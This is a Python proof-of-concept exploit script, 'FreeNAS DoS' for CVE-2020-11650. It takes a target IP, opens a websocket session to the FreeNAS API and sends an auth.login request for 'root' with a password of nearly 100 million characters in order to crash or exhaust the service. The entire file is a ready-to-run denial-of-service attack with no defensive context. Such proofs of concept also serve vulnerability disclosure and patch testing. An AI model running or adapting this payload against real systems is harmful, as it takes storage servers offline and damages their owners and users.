#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# Date: 2020/01/22
# Author: weinull

# FreeNAS DoS
# CVE-2020-11650

import sys
import json
import websocket


def main():
    target = ''
    if len(sys.argv) > 1:
        target = sys.argv[1].strip()
    if not target:
        print('[+] Target unknown')
        print('[+] Example: python attack.py TargetIP')
        exit()
    try:
        ws = websocket.create_connection('ws://{}/websocket'.format(target), timeout=20)
        data = json.dumps({
            'msg': 'connect',
            'version': '1'
        })
        ws.send(data)
        result = ws.recv()
        print('[+] Connect: {}'.format(result))

        data = json.dumps({
            'msg': 'method',
            'id': json.loads(result)['session'],
            'method': 'auth.login',
            'params': ['root', 'x'*99999999]
        })
        print('[+] Send payload')
        ws.send(data)
        ws.close()
        print('[+] Attack done')
    except Exception as e:
        print('[+] Error: {}'.format(e))


if __name__ == '__main__':
    main()
